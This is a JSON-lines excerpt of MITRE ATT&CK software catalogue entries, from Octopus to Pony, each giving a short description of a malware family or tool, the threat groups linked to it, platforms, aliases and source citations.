{"ID":"S0340","name":"Octopus","description":"[Octopus](https://attack.mitre.org/software/S0340) is a Windows Trojan written in the Delphi programming language that has been used by [Nomadic Octopus](https://attack.mitre.org/groups/G0133) to target government organizations in Central Asia since at least 2014.(Citation: Securelist Octopus Oct 2018)(Citation: Security Affairs DustSquad Oct 2018)(Citation: ESET Nomadic Octopus 2018) ","url":"https://attack.mitre.org/software/S0340","created":"30 January 2019","last modified":"06 April 2022","version":"2.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Securelist Octopus Oct 2018),(Citation: ESET Nomadic Octopus 2018),(Citation: Security Affairs DustSquad Oct 2018),,(Citation: Securelist Octopus Oct 2018),(Citation: ESET Nomadic Octopus 2018),(Citation: Security Affairs DustSquad Oct 2018)"}
{"ID":"S0439","name":"Okrum","description":"[Okrum](https://attack.mitre.org/software/S0439) is a Windows backdoor that has been seen in use since December 2016 with strong links to [Ke3chang](https://attack.mitre.org/groups/G0004).(Citation: ESET Okrum July 2019)","url":"https://attack.mitre.org/software/S0439","created":"06 May 2020","last modified":"14 May 2020","version":"1.0","contributors":"ESET","platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: ESET Okrum July 2019),,(Citation: ESET Okrum July 2019)"}
{"ID":"S0365","name":"Olympic Destroyer","description":"[Olympic Destroyer](https://attack.mitre.org/software/S0365) is malware that was used by [Sandworm Team](https://attack.mitre.org/groups/G0034) against the 2018 Winter Olympics, held in Pyeongchang, South Korea. The main purpose of the malware was to render infected computer systems inoperable. The malware leverages various native Windows utilities and API calls to carry out its destructive tasks. [Olympic Destroyer](https://attack.mitre.org/software/S0365) has worm-like features to spread itself across a computer network in order to maximize its destructive impact.(Citation: Talos Olympic Destroyer 2018)(Citation: US District Court Indictment GRU Unit 74455 October 2020) ","url":"https://attack.mitre.org/software/S0365","created":"25 March 2019","last modified":"23 April 2021","version":"2.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Secureworks IRON VIKING ),(Citation: CrowdStrike GTR 2019),(Citation: UK NCSC Olympic Attacks October 2020),(Citation: Trend Micro Cyclops Blink March 2022),,(Citation: Talos Olympic Destroyer 2018),(Citation: PsExec Russinovich),(Citation: US District Court Indictment GRU Unit 74455 October 2020)"}
{"ID":"S0052","name":"OnionDuke","description":"[OnionDuke](https://attack.mitre.org/software/S0052) is malware that was used by [APT29](https://attack.mitre.org/groups/G0016) from 2013 to 2015. (Citation: F-Secure The Dukes)","url":"https://attack.mitre.org/software/S0052","created":"31 May 2017","last modified":"23 September 2020","version":"1.2","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Secureworks IRON HEMLOCK Profile),(Citation: ESET Dukes October 2019),(Citation: F-Secure The Dukes),,(Citation: ESET Dukes October 2019),(Citation: F-Secure The Dukes)"}
{"ID":"S0264","name":"OopsIE","description":"[OopsIE](https://attack.mitre.org/software/S0264) is a Trojan used by [OilRig](https://attack.mitre.org/groups/G0049) to remotely execute commands as well as upload/download files to/from victims. (Citation: Unit 42 OopsIE! Feb 2018)","url":"https://attack.mitre.org/software/S0264","created":"17 October 2018","last modified":"30 March 2020","version":"1.2","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Unit 42 OopsIE! Feb 2018),,(Citation: Unit 42 OopsIE! Feb 2018),(Citation: Unit 42 OilRig Sept 2018)"}
{"ID":"S0229","name":"Orz","description":"[Orz](https://attack.mitre.org/software/S0229) is a custom JavaScript backdoor used by [Leviathan](https://attack.mitre.org/groups/G0065). It was observed being used in 2014 as well as in August 2017 when it was dropped by Microsoft Publisher files. (Citation: Proofpoint Leviathan Oct 2017) (Citation: FireEye Periscope March 2018)","url":"https://attack.mitre.org/software/S0229","created":"18 April 2018","last modified":"19 April 2022","version":"2.2","contributors":null,"platforms":"Windows","aliases":"AIRBREAK","type":"malware","relationship citations":"(Citation: Accenture MUDCARP March 2019),(Citation: Proofpoint Leviathan Oct 2017),(Citation: CISA AA21-200A APT40 July 2021),,(Citation: Proofpoint Leviathan Oct 2017)"}
{"ID":"S0594","name":"Out1","description":"[Out1](https://attack.mitre.org/software/S0594) is a remote access tool written in python and used by [MuddyWater](https://attack.mitre.org/groups/G0069) since at least 2021.(Citation: Trend Micro Muddy Water March 2021)","url":"https://attack.mitre.org/software/S0594","created":"19 March 2021","last modified":"26 April 2021","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"tool","relationship citations":"(Citation: Trend Micro Muddy Water March 2021),,(Citation: Trend Micro Muddy Water March 2021)"}
{"ID":"S1017","name":"OutSteel","description":"[OutSteel](https://attack.mitre.org/software/S1017) is a file uploader and document stealer developed with the scripting language AutoIT that has been used by [Ember Bear](https://attack.mitre.org/groups/G1003) since at least March 2021.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 )","url":"https://attack.mitre.org/software/S1017","created":"09 June 2022","last modified":"09 June 2022","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),,(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 )"}
{"ID":"S0072","name":"OwaAuth","description":"[OwaAuth](https://attack.mitre.org/software/S0072) is a Web shell and credential stealer deployed to Microsoft Exchange servers that appears to be exclusively used by [Threat Group-3390](https://attack.mitre.org/groups/G0027). (Citation: Dell TG-3390)","url":"https://attack.mitre.org/software/S0072","created":"31 May 2017","last modified":"17 June 2021","version":"1.2","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Dell TG-3390)"}
{"ID":"S0598","name":"P.A.S. Webshell","description":"[P.A.S. Webshell](https://attack.mitre.org/software/S0598) is a publicly available multifunctional PHP webshell in use since at least 2016 that provides remote access and execution on target web servers.(Citation: ANSSI Sandworm January 2021)","url":"https://attack.mitre.org/software/S0598","created":"13 April 2021","last modified":"13 April 2021","version":"1.0","contributors":null,"platforms":"Linux, Windows","aliases":"Fobushell","type":"malware","relationship citations":"(Citation: ANSSI Sandworm January 2021),,(Citation: ANSSI Sandworm January 2021)"}
{"ID":"S0016","name":"P2P ZeuS","description":"[P2P ZeuS](https://attack.mitre.org/software/S0016) is a closed-source fork of the leaked version of the ZeuS botnet. It presents improvements over the leaked version, including a peer-to-peer architecture. (Citation: Dell P2P ZeuS)","url":"https://attack.mitre.org/software/S0016","created":"31 May 2017","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":"Gameover ZeuS, Peer-to-Peer ZeuS","type":"malware","relationship citations":",,(Citation: Dell P2P ZeuS)"}
{"ID":"S0626","name":"P8RAT","description":"[P8RAT](https://attack.mitre.org/software/S0626) is a fileless malware used by [menuPass](https://attack.mitre.org/groups/G0045) to download and execute payloads since at least 2020.(Citation: Securelist APT10 March 2021)","url":"https://attack.mitre.org/software/S0626","created":"21 June 2021","last modified":"14 October 2021","version":"1.0","contributors":null,"platforms":"Windows","aliases":"GreetCake, HEAVYPOT","type":"malware","relationship citations":"(Citation: Securelist APT10 March 2021),,(Citation: Securelist APT10 March 2021)"}
{"ID":"S0158","name":"PHOREAL","description":"[PHOREAL](https://attack.mitre.org/software/S0158) is a signature backdoor used by [APT32](https://attack.mitre.org/groups/G0050). (Citation: FireEye APT32 May 2017)","url":"https://attack.mitre.org/software/S0158","created":"14 December 2017","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: FireEye APT32 May 2017),,(Citation: FireEye APT32 May 2017)"}
{"ID":"S0254","name":"PLAINTEE","description":"[PLAINTEE](https://attack.mitre.org/software/S0254) is a malware sample that has been used by [Rancor](https://attack.mitre.org/groups/G0075) in targeted attacks in Singapore and Cambodia. (Citation: Rancor Unit42 June 2018)","url":"https://attack.mitre.org/software/S0254","created":"17 October 2018","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Rancor Unit42 June 2018),,(Citation: Rancor Unit42 June 2018)"}
{"ID":"S0435","name":"PLEAD","description":"[PLEAD](https://attack.mitre.org/software/S0435) is a remote access tool (RAT) and downloader used by [BlackTech](https://attack.mitre.org/groups/G0098) in targeted attacks in East Asia including Taiwan, Japan, and Hong Kong.(Citation: TrendMicro BlackTech June 2017)(Citation: JPCert PLEAD Downloader June 2018) [PLEAD](https://attack.mitre.org/software/S0435) has also been referred to as [TSCookie](https://attack.mitre.org/software/S0436), though more recent reporting indicates likely separation between the two. [PLEAD](https://attack.mitre.org/software/S0435) was observed in use as early as March 2017.(Citation: JPCert TSCookie March 2018)(Citation: JPCert PLEAD Downloader June 2018)","url":"https://attack.mitre.org/software/S0435","created":"06 May 2020","last modified":"15 April 2022","version":"2.0","contributors":"Hannah Simes, BT Security; Tatsuya Daitoku, Cyber Defense Institute, Inc.","platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: JPCert PLEAD Downloader June 2018),(Citation: Symantec Palmerworm Sep 2020),(Citation: Trend Micro Waterbear December 2019),(Citation: TrendMicro BlackTech June 2017),,(Citation: JPCert PLEAD Downloader June 2018),(Citation: ESET PLEAD Malware July 2018),(Citation: TrendMicro BlackTech June 2017)"}
{"ID":"S0216","name":"POORAIM","description":"[POORAIM](https://attack.mitre.org/software/S0216) is a backdoor used by [APT37](https://attack.mitre.org/groups/G0067) in campaigns since at least 2014. (Citation: FireEye APT37 Feb 2018)","url":"https://attack.mitre.org/software/S0216","created":"18 April 2018","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: FireEye APT37 Feb 2018),,(Citation: FireEye APT37 Feb 2018)"}
{"ID":"S0150","name":"POSHSPY","description":"[POSHSPY](https://attack.mitre.org/software/S0150) is a backdoor that has been used by [APT29](https://attack.mitre.org/groups/G0016) since at least 2015. It appears to be used as a secondary backdoor used if the actors lost access to their primary backdoors. (Citation: FireEye POSHSPY April 2017)","url":"https://attack.mitre.org/software/S0150","created":"14 December 2017","last modified":"30 March 2020","version":"1.2","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: FireEye POSHSPY April 2017),,(Citation: FireEye POSHSPY April 2017)"}
{"ID":"S0145","name":"POWERSOURCE","description":"[POWERSOURCE](https://attack.mitre.org/software/S0145) is a PowerShell backdoor that is a heavily obfuscated and modified version of the publicly available tool DNS_TXT_Pwnage. It was observed in February 2017 in spearphishing campaigns against personnel involved with United States Securities and Exchange Commission (SEC) filings at various organizations. The malware was delivered when macros were enabled by the victim and a VBS script was dropped. (Citation: FireEye FIN7 March 2017) (Citation: Cisco DNSMessenger March 2017)","url":"https://attack.mitre.org/software/S0145","created":"31 May 2017","last modified":"20 July 2022","version":"1.1","contributors":null,"platforms":"Windows","aliases":"DNSMessenger","type":"malware","relationship citations":"(Citation: FireEye FIN7 March 2017),,(Citation: Cisco DNSMessenger March 2017),(Citation: FireEye FIN7 March 2017)"}
{"ID":"S0223","name":"POWERSTATS","description":"[POWERSTATS](https://attack.mitre.org/software/S0223) is a PowerShell-based first stage backdoor used by [MuddyWater](https://attack.mitre.org/groups/G0069). (Citation: Unit 42 MuddyWater Nov 2017)","url":"https://attack.mitre.org/software/S0223","created":"18 April 2018","last modified":"22 March 2023","version":"2.3","contributors":null,"platforms":"Windows","aliases":"Powermud","type":"malware","relationship citations":"(Citation: Symantec MuddyWater Dec 2018),(Citation: ClearSky MuddyWater Nov 2018),(Citation: Unit 42 MuddyWater Nov 2017),(Citation: FireEye MuddyWater Mar 2018),(Citation: ClearSky MuddyWater June 2019),,(Citation: TrendMicro POWERSTATS V3 June 2019),(Citation: ClearSky MuddyWater Nov 2018),(Citation: Unit 42 MuddyWater Nov 2017),(Citation: FireEye MuddyWater Mar 2018),(Citation: DHS CISA AA22-055A MuddyWater February 2022)"}
{"ID":"S0371","name":"POWERTON","description":"[POWERTON](https://attack.mitre.org/software/S0371) is a custom PowerShell backdoor first observed in 2018. It has typically been deployed as a late-stage backdoor by [APT33](https://attack.mitre.org/groups/G0064). At least two variants of the backdoor have been identified, with the later version containing improved functionality.(Citation: FireEye APT33 Guardrail)","url":"https://attack.mitre.org/software/S0371","created":"16 April 2019","last modified":"25 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Microsoft Holmium June 2020),(Citation: FireEye APT33 Guardrail),,(Citation: FireEye APT33 Guardrail)"}
{"ID":"S0184","name":"POWRUNER","description":"[POWRUNER](https://attack.mitre.org/software/S0184) is a PowerShell script that sends and receives commands to and from the C2 server. (Citation: FireEye APT34 Dec 2017)","url":"https://attack.mitre.org/software/S0184","created":"16 January 2018","last modified":"06 July 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: FireEye APT34 Dec 2017),,(Citation: FireEye APT34 Dec 2017),(Citation: FireEye APT34 Webinar Dec 2017)"}
{"ID":"S0613","name":"PS1","description":"[PS1](https://attack.mitre.org/software/S0613) is a loader that was used to deploy 64-bit backdoors in the [CostaRicto](https://attack.mitre.org/groups/G0132) campaign.(Citation: BlackBerry CostaRicto November 2020)","url":"https://attack.mitre.org/software/S0613","created":"24 May 2021","last modified":"05 October 2022","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",(Citation: BlackBerry CostaRicto November 2020),(Citation: BlackBerry CostaRicto November 2020)"}
{"ID":"S0196","name":"PUNCHBUGGY","description":"[PUNCHBUGGY](https://attack.mitre.org/software/S0196) is a backdoor malware used by [FIN8](https://attack.mitre.org/groups/G0061) that has been observed targeting POS networks in the hospitality industry. (Citation: Morphisec ShellTea June 2019)(Citation: FireEye Fin8 May 2016) (Citation: FireEye Know Your Enemy FIN8 Aug 2016)","url":"https://attack.mitre.org/software/S0196","created":"18 April 2018","last modified":"09 February 2021","version":"2.1","contributors":null,"platforms":"Windows","aliases":"ShellTea","type":"malware","relationship citations":"(Citation: FireEye Fin8 May 2016),,(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: Morphisec ShellTea June 2019),(Citation: FireEye Fin8 May 2016)"}
{"ID":"S0197","name":"PUNCHTRACK","description":"[PUNCHTRACK](https://attack.mitre.org/software/S0197) is non-persistent point of sale (POS) system malware utilized by [FIN8](https://attack.mitre.org/groups/G0061) to scrape payment card data. (Citation: FireEye Fin8 May 2016) (Citation: FireEye Know Your Enemy FIN8 Aug 2016)","url":"https://attack.mitre.org/software/S0197","created":"18 April 2018","last modified":"17 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":"PSVC","type":"malware","relationship citations":"(Citation: FireEye Fin8 May 2016),,(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: FireEye Fin8 May 2016)"}
{"ID":"S0664","name":"Pandora","description":"[Pandora](https://attack.mitre.org/software/S0664) is a multistage kernel rootkit with backdoor functionality that has been in use by [Threat Group-3390](https://attack.mitre.org/groups/G0027) since at least 2020.(Citation: Trend Micro Iron Tiger April 2021)","url":"https://attack.mitre.org/software/S0664","created":"29 November 2021","last modified":"15 April 2022","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Trend Micro Iron Tiger April 2021),,(Citation: Trend Micro Iron Tiger April 2021)"}
{"ID":"S0208","name":"Pasam","description":"[Pasam](https://attack.mitre.org/software/S0208) is a trojan used by [Elderwood](https://attack.mitre.org/groups/G0066) to open a backdoor on compromised hosts. (Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Pasam May 2012)","url":"https://attack.mitre.org/software/S0208","created":"18 April 2018","last modified":"06 January 2021","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Symantec Elderwood Sept 2012),,(Citation: Symantec Pasam May 2012)"}
{"ID":"S0122","name":"Pass-The-Hash Toolkit","description":"[Pass-The-Hash Toolkit](https://attack.mitre.org/software/S0122) is a toolkit that allows an adversary to \"pass\" a password hash (without knowing the original password) to log in to systems. (Citation: Mandiant APT1)","url":"https://attack.mitre.org/software/S0122","created":"31 May 2017","last modified":"17 October 2018","version":"1.0","contributors":null,"platforms":null,"aliases":null,"type":"tool","relationship citations":"(Citation: Mandiant APT1),,(Citation: Mandiant APT1)"}
{"ID":"S0556","name":"Pay2Key","description":"[Pay2Key](https://attack.mitre.org/software/S0556) is a ransomware written in C++ that has been used by [Fox Kitten](https://attack.mitre.org/groups/G0117) since at least July 2020 including campaigns against Israeli companies. [Pay2Key](https://attack.mitre.org/software/S0556) has been incorporated with a leak site to display stolen sensitive information to further pressure victims into payment.(Citation: ClearkSky Fox Kitten February 2020)(Citation: Check Point Pay2Key November 2020)","url":"https://attack.mitre.org/software/S0556","created":"04 January 2021","last modified":"22 April 2021","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Check Point Pay2Key November 2020),(Citation: ClearkSky Fox Kitten February 2020),,(Citation: Check Point Pay2Key November 2020),(Citation: ClearkSky Fox Kitten February 2020)"}
{"ID":"S1050","name":"PcShare","description":"[PcShare](https://attack.mitre.org/software/S1050) is an open source remote access tool that has been modified and used by Chinese threat actors, most notably during the FunnyDream campaign since late 2018.(Citation: Bitdefender FunnyDream Campaign November 2020)(Citation: GitHub PcShare 2014)","url":"https://attack.mitre.org/software/S1050","created":"13 October 2022","last modified":"13 October 2022","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"tool","relationship citations":",(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Bitdefender FunnyDream Campaign November 2020)"}
{"ID":"S0683","name":"Peirates","description":"[Peirates](https://attack.mitre.org/software/S0683) is a post-exploitation Kubernetes exploitation framework with a focus on gathering service account tokens for lateral movement and privilege escalation. The tool is written in GoLang and publicly available on GitHub.(Citation: Peirates GitHub)","url":"https://attack.mitre.org/software/S0683","created":"08 February 2022","last modified":"14 April 2022","version":"1.0","contributors":null,"platforms":"Containers","aliases":null,"type":"tool","relationship citations":"(Citation: TeamTNT Cloud Enumeration),,(Citation: Peirates GitHub)"}
{"ID":"S0587","name":"Penquin","description":"[Penquin](https://attack.mitre.org/software/S0587) is a remote access trojan (RAT) with multiple versions used by [Turla](https://attack.mitre.org/groups/G0010) to target Linux systems since at least 2014.(Citation: Kaspersky Turla Penquin December 2014)(Citation: Leonardo Turla Penquin May 2020)","url":"https://attack.mitre.org/software/S0587","created":"11 March 2021","last modified":"20 October 2022","version":"1.1","contributors":"Antonio Villani, @LDO_CyberSec, Leonardo's Cyber Security Division; Nino Verde, @LDO_CyberSec, Leonardo's Cyber Security Division; Silvio La Porta, @LDO_CyberSec, Leonardo's Cyber Security Division","platforms":"Linux","aliases":"Penquin 2.0, Penquin_x64","type":"malware","relationship citations":"(Citation: Leonardo Turla Penquin May 2020),,(Citation: Leonardo Turla Penquin May 2020),(Citation: Kaspersky Turla Penquin December 2014)"}
{"ID":"S0643","name":"Peppy","description":"[Peppy](https://attack.mitre.org/software/S0643) is a Python-based remote access Trojan, active since at least 2012, with similarities to [Crimson](https://attack.mitre.org/software/S0115).(Citation: Proofpoint Operation Transparent Tribe March 2016)","url":"https://attack.mitre.org/software/S0643","created":"07 September 2021","last modified":"15 October 2021","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Unit 42 ProjectM March 2016),,(Citation: Proofpoint Operation Transparent Tribe March 2016)"}
{"ID":"S0517","name":"Pillowmint","description":"[Pillowmint](https://attack.mitre.org/software/S0517) is a point-of-sale malware used by [FIN7](https://attack.mitre.org/groups/G0046) designed to capture credit card information.(Citation: Trustwave Pillowmint June 2020)","url":"https://attack.mitre.org/software/S0517","created":"27 July 2020","last modified":"26 March 2023","version":"1.2","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: CrowdStrike Carbon Spider August 2021),(Citation: Trustwave Pillowmint June 2020),,(Citation: Trustwave Pillowmint June 2020)"}
{"ID":"S0048","name":"PinchDuke","description":"[PinchDuke](https://attack.mitre.org/software/S0048) is malware that was used by [APT29](https://attack.mitre.org/groups/G0016) from 2008 to 2010. (Citation: F-Secure The Dukes)","url":"https://attack.mitre.org/software/S0048","created":"31 May 2017","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: F-Secure The Dukes),,(Citation: F-Secure The Dukes)"}
{"ID":"S0097","name":"Ping","description":"[Ping](https://attack.mitre.org/software/S0097) is an operating system utility commonly used to troubleshoot and verify network connections. (Citation: TechNet Ping)","url":"https://attack.mitre.org/software/S0097","created":"31 May 2017","last modified":"04 January 2023","version":"1.3","contributors":null,"platforms":null,"aliases":null,"type":"tool","relationship citations":"(Citation: Group IB APT 41 June 2021),(Citation: DFIR Ryuk in 5 Hours October 2020),(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020),(Citation: DFIR Phosphorus November 2021),(Citation: DFIR Ryuk's Return October 2020),(Citation: Cybereason Soft Cell June 2019),(Citation: Alperovitch 2014),(Citation: ClearSky Siamesekitten August 2021),(Citation: NCC Group APT15 Alive and Strong),(Citation: Symantec Shuckworm January 2022),(Citation: FireEye APT10 April 2017),(Citation: FireEye APT41 Aug 2019),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Baumgartner Naikon 2015),(Citation: Bitdefender Naikon April 2021),(Citation: Mandiant APT41),(Citation: Costa AvosLocker May 2022),(Citation: TechNet Ping)"}
{"ID":"S1031","name":"PingPull","description":"[PingPull](https://attack.mitre.org/software/S1031) is a remote access Trojan (RAT) written in Visual C++ that has been used by [GALLIUM](https://attack.mitre.org/groups/G0093) since at least June 2022. [PingPull](https://attack.mitre.org/software/S1031) has been used to target telecommunications companies, financial institutions, and government entities in Afghanistan, Australia, Belgium, Cambodia, Malaysia, Mozambique, the Philippines, Russia, and Vietnam.(Citation: Unit 42 PingPull Jun 2022)","url":"https://attack.mitre.org/software/S1031","created":"09 August 2022","last modified":"24 October 2022","version":"1.0","contributors":"Manikantan Srinivasan, NEC Corporation India; Pooja Natarajan, NEC Corporation India; Yoshihiro Kori, NEC Corporation","platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Unit 42 PingPull Jun 2022),,(Citation: Unit 42 PingPull Jun 2022)"}
{"ID":"S0501","name":"PipeMon","description":"[PipeMon](https://attack.mitre.org/software/S0501) is a multi-stage modular backdoor used by [Winnti Group](https://attack.mitre.org/groups/G0044).(Citation: ESET PipeMon May 2020)","url":"https://attack.mitre.org/software/S0501","created":"24 August 2020","last modified":"26 March 2023","version":"1.1","contributors":"Martin Smolár, ESET; Mathieu Tartare, ESET","platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: ESET PipeMon May 2020),,(Citation: ESET PipeMon May 2020)"}
{"ID":"S0124","name":"Pisloader","description":"[Pisloader](https://attack.mitre.org/software/S0124) is a malware family that is notable due to its use of DNS as a C2 protocol as well as its use of anti-analysis tactics. It has been used by [APT18](https://attack.mitre.org/groups/G0026) and is similar to another malware family, [HTTPBrowser](https://attack.mitre.org/software/S0070), that has been used by the group. (Citation: Palo Alto DNS Requests)","url":"https://attack.mitre.org/software/S0124","created":"31 May 2017","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Palo Alto DNS Requests),,(Citation: Palo Alto DNS Requests)"}
{"ID":"S0013","name":"PlugX","description":"[PlugX](https://attack.mitre.org/software/S0013) is a remote access tool (RAT) with modular plugins that has been used by multiple threat groups.(Citation: Lastline PlugX Analysis)(Citation: FireEye Clandestine Fox Part 2)(Citation: New DragonOK)(Citation: Dell TG-3390)","url":"https://attack.mitre.org/software/S0013","created":"31 May 2017","last modified":"10 April 2023","version":"3.1","contributors":null,"platforms":"Windows","aliases":"DestroyRAT, Kaba, Korplug, Sogu, TVT, Thoper","type":"malware","relationship citations":"(Citation: Cisco Group 72),(Citation: SecureWorks BRONZE UNION June 2017),(Citation: Malwarebytes Higaisa 2020),(Citation: FireEye Clandestine Fox Part 2),(Citation: Trend Micro DRBControl February 2020),(Citation: Proofpoint TA416 Europe March 2022),(Citation: Novetta-Axiom),(Citation: Recorded Future REDDELTA July 2020),(Citation: New DragonOK),(Citation: FireEye APT41 Aug 2019),(Citation: Anomali MUSTANG PANDA October 2019),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Dell TG-3390),(Citation: Kaspersky LuminousMoth July 2021),(Citation: Bitdefender LuminousMoth July 2021),(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: Avira Mustang Panda January 2020),(Citation: Crowdstrike MUSTANG PANDA June 2018),(Citation: Kaspersky Winnti April 2013),(Citation: Cybereason Soft Cell June 2019),(Citation: Nccgroup Emissary Panda May 2018),(Citation: FireEye APT10 April 2017),(Citation: Profero APT27 December 2020),(Citation: DOJ APT10 Dec 2018),(Citation: Proofpoint TA459 April 2017),,(Citation: Lastline PlugX Analysis),(Citation: Stewart 2014),(Citation: FireEye APT10 April 2017),(Citation: Profero APT27 December 2020),(Citation: FireEye Clandestine Fox Part 2),(Citation: Trend Micro DRBControl February 2020),(Citation: CIRCL PlugX March 2013),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Proofpoint ZeroT Feb 2017),(Citation: Unit42 PlugX June 2017),(Citation: Proofpoint TA416 Europe March 2022),(Citation: Dell TG-3390),(Citation: Palo Alto PlugX June 2017)"}
{"ID":"S0428","name":"PoetRAT","description":"[PoetRAT](https://attack.mitre.org/software/S0428) is a remote access trojan (RAT) that was first identified in April 2020. [PoetRAT](https://attack.mitre.org/software/S0428) has been used in multiple campaigns against the private and public sectors in Azerbaijan, including ICS and SCADA systems in the energy sector. The STIBNITE activity group has been observed using the malware. [PoetRAT](https://attack.mitre.org/software/S0428) derived its name from references in the code to poet William Shakespeare. (Citation: Talos PoetRAT April 2020)(Citation: Talos PoetRAT October 2020)(Citation: Dragos Threat Report 2020)","url":"https://attack.mitre.org/software/S0428","created":"27 April 2020","last modified":"22 March 2023","version":"2.2","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Talos PoetRAT April 2020),(Citation: Dragos Threat Report 2020),(Citation: Talos PoetRAT October 2020)"}
{"ID":"S0012","name":"PoisonIvy","description":"[PoisonIvy](https://attack.mitre.org/software/S0012) is a popular remote access tool (RAT) that has been used by many groups.(Citation: FireEye Poison Ivy)(Citation: Symantec Elderwood Sept 2012)(Citation: Symantec Darkmoon Aug 2005)","url":"https://attack.mitre.org/software/S0012","created":"31 May 2017","last modified":"20 March 2023","version":"2.1","contributors":"Darren Spruell","platforms":"Windows","aliases":"Breut, Darkmoon, Poison Ivy","type":"malware","relationship citations":"(Citation: Cisco Group 72),(Citation: Symantec Elderwood Sept 2012),(Citation: Mandiant APT1),(Citation: Novetta-Axiom),(Citation: Recorded Future REDDELTA July 2020),(Citation: Securelist APT Trends Q2 2017),(Citation: Microsoft GALLIUM December 2019),(Citation: DustySky2),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: FireEye admin@338),(Citation: FireEye Operation Molerats),(Citation: Unit 42 Tropic Trooper Nov 2016),(Citation: Crowdstrike MUSTANG PANDA June 2018),(Citation: District Court of NY APT10 Indictment December 2018),(Citation: Operation Quantum Entanglement),(Citation: DustySky),(Citation: Cybereason Soft Cell June 2019),(Citation: Haq 2014),(Citation: Villeneuve 2014),(Citation: Cylance Dust Storm),(Citation: Microsoft PoisonIvy 2017),(Citation: FireEye Regsvr32 Targeting Mongolian Gov),(Citation: Symantec Darkmoon Aug 2005),(Citation: paloalto Tropic Trooper 2016),(Citation: FireEye Poison Ivy)"}
{"ID":"S0518","name":"PolyglotDuke","description":"[PolyglotDuke](https://attack.mitre.org/software/S0518) is a downloader that has been used by [APT29](https://attack.mitre.org/groups/G0016) since at least 2013. [PolyglotDuke](https://attack.mitre.org/software/S0518) has been used to drop [MiniDuke](https://attack.mitre.org/software/S0051).(Citation: ESET Dukes October 2019)","url":"https://attack.mitre.org/software/S0518","created":"23 September 2020","last modified":"26 March 2023","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Secureworks IRON HEMLOCK Profile),(Citation: ESET Dukes October 2019),(Citation: ESET Dukes October 2019),(Citation: ESET Dukes October 2019)"}
{"ID":"S0453","name":"Pony","description":"[Pony](https://attack.mitre.org/software/S0453) is a credential stealing malware, though has also been used among adversaries for its downloader capabilities. The source code for Pony Loader 1.0 and 2.0 were leaked online, leading to their use by various threat actors.(Citation: Malwarebytes Pony April 2016)","url":"https://attack.mitre.org/software/S0453","created":"21 May 2020","last modified":"25 June 2020","version":"1.0","contributors":"Arie Olshtein, Check Point; Kobi Eisenkraft, Check Point","platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Malwarebytes Pony April 2016)"}
